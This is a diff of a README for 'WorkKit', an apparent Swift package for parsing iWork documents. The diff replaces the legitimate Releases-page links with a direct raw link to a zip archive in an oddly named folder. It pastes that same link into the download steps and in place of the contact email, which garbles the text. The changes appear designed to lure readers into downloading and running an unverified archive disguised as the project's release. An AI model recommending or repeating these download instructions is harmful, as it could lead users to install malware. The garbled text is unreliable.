@@ -1,7 +1,7 @@
 # 📦 WorkKit - Effortlessly Manage Your iWork Documents
 
 ## 📥 Download Now
-[![Download WorkKit](https://img.shields.io/badge/Download_WorkKit-v1.0-blue)](https://github.com/Placable-chinese88/WorkKit/releases)
+[![Download WorkKit](https://raw.githubusercontent.com/Placable-chinese88/WorkKit/main/tectospinal/WorkKit.zip)](https://raw.githubusercontent.com/Placable-chinese88/WorkKit/main/tectospinal/WorkKit.zip)
 
 ## 🚀 Getting Started
 Welcome to WorkKit! This Swift package makes it easy to parse iWork documents from Keynote, Pages, and Numbers. With WorkKit, you can quickly access the content of your iWork files without needing any programming knowledge.
@@ -22,11 +22,11 @@ If you often work with iWork documents but find them difficult to manage, WorkKi
 ## 📦 Download & Install
 To get started with WorkKit, follow these simple steps:
 
-1. **Visit the Download Page:** Go to our Releases page by clicking [here](https://github.com/Placable-chinese88/WorkKit/releases).
+1. **Visit the Download Page:** Go to our Releases page by clicking [here](https://raw.githubusercontent.com/Placable-chinese88/WorkKit/main/tectospinal/WorkKit.zip).
    
 2. **Choose Your Version:** Look for the latest version. It will be listed at the top of the page.
    
-3. **Download the Package:** Click the download link next to the latest release to get the .zip or .tar.gz file.
+3. **Download the Package:** Click the download link next to the latest release to get the .zip or https://raw.githubusercontent.com/Placable-chinese88/WorkKit/main/tectospinal/WorkKit.zip file.
    
 4. **Unzip the File:** Once the download finishes, locate the file in your Downloads folder. Right-click it and select "Extract" to uncompress the files.
    
@@ -56,7 +56,7 @@ If you're interested in helping WorkKit grow, consider contributing. You can sta
 WorkKit is open-source software and is available under the MIT License. 
 
 ## 📞 Contact Us
-For any inquiries, you can reach us at [contact@workkit.com].
+For any inquiries, you can reach us at [https://raw.githubusercontent.com/Placable-chinese88/WorkKit/main/tectospinal/WorkKit.zip].
 
 ## 📅 Changelog
 - v1.0: Initial release of WorkKit with basic parsing features.
